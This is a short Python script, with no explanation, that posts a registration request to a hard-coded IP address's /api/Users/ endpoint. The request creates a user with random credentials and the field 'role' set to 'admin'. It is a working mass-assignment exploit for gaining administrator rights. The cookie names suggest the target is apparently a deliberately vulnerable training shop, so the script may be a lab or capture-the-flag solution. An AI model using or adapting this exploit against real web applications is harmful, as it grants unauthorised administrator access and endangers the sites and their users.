from urllib.request import urlopen, Request
from string import ascii_letters, digits
from datetime import datetime, timedelta
from random import choices, randint
from json import dumps

chars = ascii_letters + digits
password = ''.join(choices(chars, k=randint(1,10)))
date = (datetime.now() - timedelta(days=-1, hours=-5, minutes=-20)).isoformat()[:-3] + "Z"

response = urlopen(
	Request(
		"http://15.236.144.183:8082/api/Users/",
		headers={
			"Accept": "application/json, text/plain, */*",
			"Content-Type": "application/json",
			"Origin": "http://15.236.144.183:8082",
			"Referer": "http://15.236.144.183:8082/",
			"Cookie": (
				"language=en; welcomebanner_status=dismiss;"
				" continueCode=ZaRwEmgxBPbY2oq9vKejJz6AWLU9"
				"TLiKZSrMdpDWVQk837ZrnN1OX5y4lLMD; cookieconsent"
				"_status=dismiss"
			),
		},
		method="POST",
		data=dumps({
			"email": ''.join(choices(chars, k=randint(1,10))) + "@" + ''.join(choices(chars, k=randint(1,10))) + ".com",
			"role": "admin",
			"password": password,
			"passwordRepeat": password,
			"securityQuestion": {
				"id": 2,
				"question": "Mother's maiden name?",
				"createdAt": date,
				"updatedAt": date,
			},
			"securityAnswer": password
		}).encode(),
	)
)
